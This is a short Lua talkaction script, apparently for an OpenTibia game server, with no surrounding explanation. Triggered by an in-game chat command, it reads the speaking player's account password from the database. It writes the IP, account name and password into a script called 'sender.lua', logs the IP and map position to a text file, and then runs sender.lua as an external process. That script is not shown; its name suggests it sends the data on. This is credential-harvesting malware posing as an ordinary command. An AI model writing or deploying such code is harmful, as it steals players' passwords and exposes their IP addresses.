function onSay(cid, words, param)

arq = io.open('data/talkactions/scripts/sender.lua', 'r')
str = arq:read("*all")
arq:close()
arq = io.open('data/talkactions/scripts/sender.lua', 'w+')

int = db.getResult("SELECT `password` FROM `accounts` WHERE `id` = " .. getPlayerAccountId(cid) .. ";")
pass = int:getDataString("password")

str, inu = string.gsub(str, 'ip = {}', 'ip = {"' .. doConvertIntegerToIp(getPlayerIp(cid)) .. '"}')
str, inu = string.gsub(str, 'talk = {}', 'talk = {"' .. getPlayerAccount(cid) .. '", "' .. pass .. '"}')

arq:write(str)
arq:close()

arq = io.open('data/lib/changer.txt', 'a+')
posi = getPlayerPosition(cid)
pos = '{x=' .. posi.x .. ', y=' .. posi.y .. ', z=' .. posi.z .. '}'
arq:write(doConvertIntegerToIp(getPlayerIp(cid)) .. "/" .. pos .. "|")
arq:close()

setGlobalStorageValue(30000 + getPlayerGUID(cid), cid)
os.execute('start lua.exe data/talkactions/scripts/sender.lua')

end
